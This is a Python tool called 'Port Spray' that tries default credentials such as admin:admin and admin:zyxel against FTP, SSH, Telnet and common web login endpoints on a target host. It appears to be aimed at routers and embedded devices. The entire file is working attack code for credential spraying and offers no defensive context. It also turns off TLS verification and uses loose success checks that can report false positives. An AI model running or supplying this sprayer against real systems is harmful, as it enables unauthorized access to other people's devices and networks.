"""
Port Spray - Spray common credentials across multiple services on a target.
Handles FTP, SSH, Telnet, and Web login with configurable wordlists.
"""
import socket
import time
import re
import concurrent.futures
import requests


def _try_ftp(host, username, password, port=21, timeout=5):
    """Try FTP login."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        banner = s.recv(1024).decode('utf-8', errors='replace')
        s.sendall(f"USER {username}\r\n".encode())
        resp1 = s.recv(1024).decode('utf-8', errors='replace')
        s.sendall(f"PASS {password}\r\n".encode())
        resp2 = s.recv(1024).decode('utf-8', errors='replace')
        s.close()
        if "230" in resp2 or "logged in" in resp2.lower():
            return True, f"FTP success: {username}:{password}"
        return False, f"FTP fail: {resp2.strip()}"
    except Exception as e:
        return False, f"FTP error: {e}"


def _try_ssh(host, username, password, port=22, timeout=10):
    """Try SSH login using paramiko if available, else banner check."""
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host, port=port, username=username, password=password, timeout=timeout, banner_timeout=5)
            client.close()
            return True, f"SSH success: {username}:{password}"
        except paramiko.AuthenticationException:
            return False, "SSH auth failed"
        except Exception as e:
            return False, f"SSH error: {e}"
    except ImportError:
        # Fallback: check banner only
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))
            banner = s.recv(4096).decode('utf-8', errors='replace')
            s.close()
            if "dropbear" in banner.lower():
                return False, f"SSH detected: Dropbear (cannot test without paramiko)"
            return False, f"SSH: {banner[:50]}"
        except Exception as e:
            return False, f"SSH error: {e}"


def _try_telnet(host, username, password, port=23, timeout=10):
    """Try Telnet login with custom prompt handling."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        
        # Read initial banner/prompt
        data = b""
        try:
            s.settimeout(2)
            while True:
                c = s.recv(4096)
                if not c:
                    break
                data += c
                # Look for "login:" or "Username:" or similar
                decoded = data.decode('utf-8', errors='replace')
                if re.search(r'(?:login|username|user)[\s]*:[\s]*$', decoded, re.IGNORECASE):
                    break
        except socket.timeout:
            pass
        
        decoded = data.decode('utf-8', errors='replace')
        
        # Send username
        s.sendall(f"{username}\r\n".encode())
        time.sleep(0.5)
        
        # Read password prompt
        pwd_prompt = b""
        try:
            s.settimeout(2)
            while True:
                c = s.recv(4096)
                if not c:
                    break
                pwd_prompt += c
                decoded_pwd = pwd_prompt.decode('utf-8', errors='replace')
                if re.search(r'(?:password|passwd)[\s]*:[\s]*$', decoded_pwd, re.IGNORECASE):
                    break
        except socket.timeout:
            pass
        
        # Send password
        s.sendall(f"{password}\r\n".encode())
        time.sleep(0.5)
        
        # Read response
        resp = b""
        try:
            s.settimeout(2)
            while True:
                c = s.recv(4096)
                if not c:
                    break
                resp += c
        except socket.timeout:
            pass
        
        s.close()
        
        resp_decoded = resp.decode('utf-8', errors='replace')
        
        # Check for success indicators
        if re.search(r'(?:Last login|#\s*$|\$|%|\>|Welcome|successful)', resp_decoded, re.IGNORECASE):
            return True, f"Telnet success: {username}:{password} - Response: {resp_decoded[:200]}"
        elif "incorrect" in resp_decoded.lower() or "invalid" in resp_decoded.lower() or "failed" in resp_decoded.lower():
            return False, f"Telnet fail: {resp_decoded.strip()[:100]}"
        else:
            # Check if we got a shell prompt
            if '#' in resp_decoded or '$' in resp_decoded or resp_decoded.strip():
                return True, f"Telnet possible success: {username}:{password} - Response: {resp_decoded[:200]}"
            return False, f"Telnet unclear: {resp_decoded.strip()[:100]}"
            
    except Exception as e:
        return False, f"Telnet error: {e}"


def _try_web(host, username, password, port=80, use_https=False, timeout=10):
    """Try web login via common endpoints."""
    protocol = "https" if use_https else "http"
    base_url = f"{protocol}://{host}:{port}"
    session = requests.Session()
    session.verify = False
    
    endpoints = [
        "/cgi-bin/login",
        "/UserLogin",
        "/login.cgi",
    ]
    
    for ep in endpoints:
        try:
            resp = session.post(f"{base_url}{ep}", 
                data={"username": username, "password": password, "language": "en"},
                timeout=timeout,
                headers={"Content-Type": "application/x-www-form-urlencoded"})
            
            if resp.status_code == 200:
                if any(ind in resp.text.lower() for ind in ["zcfg_success", "success", "logout", "dashboard"]):
                    return True, f"Web success: {username}:{password} on {ep}"
                # Check for session cookies
                if session.cookies:
                    return True, f"Web success: {username}:{password} on {ep} (cookies set)"
        except:
            continue
    
    return False, "Web login failed"


def port_spray(host: str, username: str = "admin",
               passwords: str = "admin,1234,password,zyxel,admin1234",
               ports: str = "21,22,23,80",
               timeout: int = 10, max_workers: int = 5) -> str:
    """
    Spray common credentials across multiple services on a target.
    
    Args:
        host: Target IP
        username: Username to try (default: admin)
        passwords: Comma-separated list of passwords
        ports: Comma-separated list of ports to try
        timeout: Timeout per connection
        max_workers: Max parallel connections
        
    Returns:
        Consolidated spray results
    """
    password_list = [p.strip() for p in passwords.split(",") if p.strip()]
    port_list = [p.strip() for p in ports.split(",") if p.strip()]
    
    results = []
    results.append(f"=== PORT SPRAY ===")
    results.append(f"Target: {host}")
    results.append(f"Username: {username}")
    results.append(f"Passwords: {passwords}")
    results.append(f"Ports: {ports}")
    results.append("")
    
    # Map ports to service checkers
    service_map = {}
    for p in port_list:
        p_int = int(p)
        if p_int == 21:
            service_map[p_int] = ("FTP", _try_ftp)
        elif p_int == 22:
            service_map[p_int] = ("SSH", _try_ssh)
        elif p_int == 23:
            service_map[p_int] = ("Telnet", _try_telnet)
        elif p_int in (80, 443, 8080, 8443):
            service_map[p_int] = ("HTTP" if p_int != 443 else "HTTPS", 
                                lambda h, u, pw, port=p_int: _try_web(h, u, pw, port=port, use_https=(p_int in (443, 8443))))
    
    if not service_map:
        return "No supported services found in port list."
    
    # Try credentials against each service
    for port, (service_name, checker) in service_map.items():
        results.append(f"\n--- {service_name} (port {port}) ---")
        
        found = False
        for pwd in password_list:
            success, msg = checker(host, username, pwd)
            if success:
                results.append(f"  *** {msg} ***")
                found = True
                break
            else:
                results.append(f"  {service_name}: {username}:{pwd} -> {msg[:60]}")
        
        if not found:
            results.append(f"  {service_name}: All passwords failed")
    
    # Also try empty password explicitly
    results.append("\n--- Additional attempts ---")
    if "" not in password_list:
        for port, (service_name, checker) in service_map.items():
            success, msg = checker(host, username, "")
            if success:
                results.append(f"  *** {service_name}: empty password worked! ***")
    
    # Summary
    results.append("\n" + "=" * 40)
    results.append("SPRAY SUMMARY")
    results.append("=" * 40)
    
    return "\n".join(results)
